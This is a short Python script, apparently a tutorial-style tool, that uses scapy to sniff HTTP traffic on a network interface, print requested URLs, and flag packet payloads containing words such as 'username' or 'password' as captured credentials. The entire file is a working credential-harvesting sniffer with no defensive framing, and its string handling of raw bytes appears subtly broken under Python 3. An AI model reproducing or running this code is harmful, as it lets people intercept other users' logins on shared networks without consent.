import scapy.all as scapy
from scapy.layers import http

# Function to start sniffing packets on the specified interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to extract URL from HTTP request packets
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function to extract login information from packet payloads
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "username", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

# Function to process sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

# Main function
def main():
    interface = "eth0"  # Specify your interface here
    sniff(interface)

# Entry point of the program
if __name__ == "__main__":
    main()

